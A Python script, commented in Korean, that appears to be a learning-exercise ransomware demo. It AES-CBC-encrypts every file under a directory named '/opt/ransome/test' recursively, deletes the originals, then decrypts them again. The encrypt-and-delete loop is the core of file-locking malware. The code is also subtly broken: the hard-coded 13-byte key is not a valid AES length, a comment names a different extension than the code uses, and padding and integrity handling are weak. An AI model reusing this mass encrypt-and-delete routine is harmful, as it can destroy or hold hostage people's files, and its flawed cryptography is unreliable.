import glob
import os, random, struct
from Crypto.Cipher import AES       # 파이썬3 사용시 pycryptodome 또는 pycryptodomex 암호화 모듈 사용


def encrypt_file(key, in_filename, out_filename=None, chunksize=64 * 1024):
    """ Encrypts a file using AES (CBC mode) with the
        given key.
        key:
            The encryption key - a string that must be
            either 16, 24 or 32 bytes long. Longer keys
            are more secure.
        in_filename:
            Name of the input file
        out_filename:
            If None, '<in_filename>.enc' will be used.
        chunksize:
            Sets the size of the chunk which the function
            uses to read and encrypt the file. Larger chunk
            sizes can be faster for some files and machines.
            chunksize must be divisible by 16.
    """
    if not out_filename:
        out_filename = in_filename + '.enc'                 # 암호화 할시 .enk 확장자 추가, out_filename 인자 미지정시 기존파일명에 확장자 추가

    iv = os.urandom(16)                                     # 랜덤한 16자리의 Byte값을 생
    encryptor = AES.new(key, AES.MODE_CBC, iv)              # cryptodomex 모듈의 AES를 이용하여 암호화 키를 생
    filesize = os.path.getsize(in_filename)                 # 현재 파일의 파일크기 추출

    with open(in_filename, 'rb') as infile:                 # 현재 파일을 바이너리 모드로 읽음
        with open(out_filename, 'wb') as outfile:           # 바이너리 모드로 새로운 파일을 생성
            outfile.write(struct.pack('<Q', filesize))      # 파일크기를 바이너리로 int형으로 패킹하여 새 파일에 작성
            outfile.write(iv)                               # 새 파일에 랜덤한 16자리의 Byte를 작

            while True:
                chunk = infile.read(chunksize)              # 현재파일의 (64 * 1024 = 65536) 만큰을 읽어들여 쓰레기값 이라고 선언
                if len(chunk) == 0:                         # 현재파일 쓰레기 값의 길이가 0일때 루프 탈출
                    break
                elif len(chunk) % 16 != 0:                  # 현재 파일의 쓰레기 값이 16으로 나눴을때 나머지가 0이아닐 경우
                    chunk += b' ' * (16 - len(chunk) % 16)  # 쓰레기값 += 빈 바이너리 (16 - 현재쓰레기길이 % 16)

                outfile.write(encryptor.encrypt(chunk))


def decrypt_file(key, in_filename, out_filename=None, chunksize=24 * 1024):
    """ Decrypts a file using AES (CBC mode) with the
        given key. Parameters are similar to encrypt_file,
        with one difference: out_filename, if not supplied
        will be in_filename without its last extension
        (i.e. if in_filename is 'aaa.zip.enc' then
        out_filename will be 'aaa.zip')
    """
    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]     # 파일명이 지정되지 앟을 경우, 기존의 확장자 추출 / 현재 test.txt.enc 상태

    with open(in_filename, 'rb') as infile:                 # 현재 파일을 바이너리로 읽어들임
        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]        # 현재 파일의 int형으로 된 부분을 읽어들여 다시 원래 상태로 언패킹
        iv = infile.read(16)                                # 현재파일의 16자리를 읽어들임
        decryptor = AES.new(key, AES.MODE_CBC, iv)          # AES 로 암호화된 키값을 생성

        with open(out_filename, 'wb') as outfile:           # 새 파일을 바이너리 모드로 생성
            while True:
                chunk = infile.read(chunksize)              # 쓰레리값을 읽어들임 65536
                if len(chunk) == 0:                         # 쓰레기값이 0일 경우 루프 탈출
                    break
                outfile.write(decryptor.decrypt(chunk))     # 쓰레기를 복호화해서 새파일에 작성

            outfile.truncate(origsize)                      # 새 파일에 언패킹한 크기 만큼 잘라냄


#key = 'This is a key123'                                   # 기존 코드
key = b'This si a key'                                      # AES 암호화에 사용될 키값을 바이너리로 생성
startPath = '/opt/ransome/test/**'                          # 암/복호화할 대상 경로

# Encrypts all files recursively starting from startPath
for filename in glob.iglob(startPath, recursive=True):      # 대상 경로를 재귀적 호출 사용
    if (os.path.isfile(filename)):                          # 현재 파일이 파일일때
        print('Encrypting> ' + filename)                    # 파일명 출력
        encrypt_file(key, filename)                         # Encrypt_file 에 위에서 선언한 키값과 파일명을 인자로 호출
        os.remove(filename)                                 # 현재파일을 제거 (encrypt_file 함수에서 새파일을 작성하였기에 기존파일을 제거해야함

# Decrypts the files
for filename in glob.iglob(startPath, recursive=True):      # 대상 경로를 재귀적 호출
    if (os.path.isfile(filename)):                          # 현재파일이 파일일 때
        fname, ext = os.path.splitext(filename)             # 파일명과 확장자를 추출
        if (ext == '.enc'):                                 # 확장자가 .enc (암호화된 파일일 때)
            print('Decrypting> ' + filename)                # 파일명 출력
            decrypt_file(key, filename)                     # 복호화 함수 실행
            os.remove(filename)                             # 암호화됐던 파일을 제거 (마찬가지로 새파일을 작성하였기에 기존파일 제거 해야함)